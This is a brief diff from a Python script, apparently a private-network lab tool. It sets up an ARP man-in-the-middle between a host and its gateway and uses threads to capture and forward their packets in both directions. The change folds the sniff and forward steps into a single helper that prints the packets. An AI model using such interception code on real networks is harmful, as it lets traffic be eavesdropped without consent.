@@ -37,8 +37,7 @@ start_arp_mitm("192.168.1.101", "00:0c:29:20:af:e4", "192.168.1.1", "00:0c:29:94
 
 def test(src_ip, dst_mac):
 	while True:
-		pkt = start_targeted_sniff([src_ip], "eth0")
-		forward(pkt, "00:0c:29:97:ee:06", dst_mac, "eth0")
+		capture_and_forward(src_ip, dst_mac, "00:0c:29:97:ee:06", "eth0", print)
 t1 = threading.Thread(target=test, args=("192.168.1.101", "00:0c:29:94:84:aa"), daemon=True)
 t2 = threading.Thread(target=test, args=("192.168.1.1", "00:0c:29:20:af:e4"), daemon=True)
 
